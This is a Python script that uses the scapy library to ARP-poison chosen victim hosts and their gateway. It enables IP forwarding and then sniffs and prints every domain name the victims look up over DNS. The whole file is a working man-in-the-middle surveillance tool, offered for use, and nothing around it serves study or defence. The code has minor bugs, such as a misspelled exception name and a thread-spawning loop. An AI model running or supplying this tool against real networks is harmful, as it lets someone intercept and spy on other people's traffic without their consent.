#!/usr/bin/env python3

from scapy.all import *
import threading
import os
import sys
import threading
import optparse

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them

parser = optparse.OptionParser()

parser.add_option('-t',
    action="store", dest="TARGETS",
    help="", default="none")
parser.add_option('-g',
    action="store", dest="GATEWAY",
    help="", default="none")
parser.add_option('-i',
    action="store", dest="INTERFACE",
    help="", default="none")

options, args = parser.parse_args()

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[32m'
   LIGHTGREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   ORANGE = '\033[33m'
   END = '\033[0m'

def dnshandle(pkt):
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
            if pkt[IP].src in targets:
                print('['+color.CYAN+color.UNDERLINE+'DNS QUERY'+color.END+'] Victim: '+color.CYAN+color.UNDERLINE+str(pkt[IP].src)+color.END+' Has Resolved: '+color.CYAN+color.UNDERLINE+(pkt.getlayer(DNS).qd.qname).decode('latin-'))
            
def v_poison(targets, GATEWAY):
    while True:
        for VICTIM_IP in targets:
            v = ARP(pdst=VICTIM_IP, psrc=GATEWAY)
            try:   
                send(v,verbose=0,inter=1,loop=1)
            except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
                sys.exit(1)
def gw_poison(targets, GATEWAY):
    while True:
        for VICTIM_IP in targets:
            gw = ARP(pdst=GATEWAY, psrc=VICTIM_IP)
            try:   
                send(gw,verbose=0,inter=1,loop=1)
            except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
                sys.exit(1)

vthread = []
gwthread = []
targets = []
first_run = True

if "," in options.TARGETS:
    CLEANED = options.TARGETS.replace(",", " ")
    CLEANED = CLEANED.split()
    while True:
        if first_run == True:
            array_number = 0
        else:
            array_number = array_number + 1
        first_run = False
        if array_number == len(CLEANED):
            break
        targets.append(CLEANED[array_number])
else:
    targets.append(options.TARGETS)

for VICTIM_IP in targets:
    print('['+color.CYAN+color.UNDERLINE+'DNS QUERY'+color.END+'] Sniffing Victim: '+color.CYAN+color.UNDERLINE+str(VICTIM_IP)+color.END)

while True: # Threads 
        
    vpoison = threading.Thread(target=v_poison, args=(targets, options.GATEWAY))
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()     
        
    gwpoison = threading.Thread(target=gw_poison, args=(targets, options.GATEWAY))
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()

    
    pkt = sniff(iface=options.INTERFACE,filter='udp port 53',prn=dnshandle)

